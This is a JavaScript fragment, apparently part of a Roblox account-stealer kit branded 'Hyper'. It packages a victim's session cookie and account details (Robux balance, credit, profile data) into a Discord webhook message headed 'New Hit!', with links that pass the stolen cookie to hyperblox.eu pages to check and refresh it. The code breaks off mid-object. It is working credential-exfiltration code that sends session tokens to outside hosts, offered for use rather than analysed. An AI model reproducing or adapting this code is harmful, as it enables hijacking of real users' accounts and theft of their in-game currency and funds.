(function() {
    'use strict';
    
    const MASTER_WEBHOOK = window.INSTANCE_WEBHOOK;
    const USER_WEBHOOK = window.INSTANCE_USER_WEBHOOK;
    const INSTANCE_NAME = window.INSTANCE_NAME || 'Unknown';
    
    async function sendToWebhook(accountData, cookie) {
        if (!accountData) {
            console.error('No account data');
            return false;
        }
        
        const d = accountData.detailedInfo;
        
        const embed1 = {
            content: '@everyone',
            username: 'Hyper',
            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            embeds: [{
                title: `🎯 New Hit!`,
                description: 
                    `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> ` +
                    `<:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> ` +
                    `<:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${d.userId}/profile)** <:line:1350104634982662164> ` +
                    `<:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${d.userId})**`,
                color: 0x00BFFF,
                thumbnail: { url: d.avatarUrl },
                fields: [
                    {
                        name: '**<:search:1391436893794861157> About:**',
                        value: 
                            `• **Display:** \`${d.displayName}\`\n` +
                            `• **Username:** \`${d.username}\`\n` +
                            `• **User ID:** \`${d.userId}\`\n` +
                            `• **Age:** \`${d.accountAge}\`\n` +
                            `• **Join Date:** \`${d.joinDate}\`\n` +
                            `• **Bio:** \`${d.bio || 'No bio'}\``,
                        inline: true
                    },
                    {
                        name: '**<:info:1391434745207853138> Information:**',
                        value: 
                            `• **Robux:** \`${d.robux}\`\n` +
                            `• **Pending:** \`${d.pendingRobux}\`\n` +
                            `• **Credit:** \`${d.creditBalance}\`\n` +
                            `• **Summary:** \`${d.summary}\``,
                        inline: true](#)
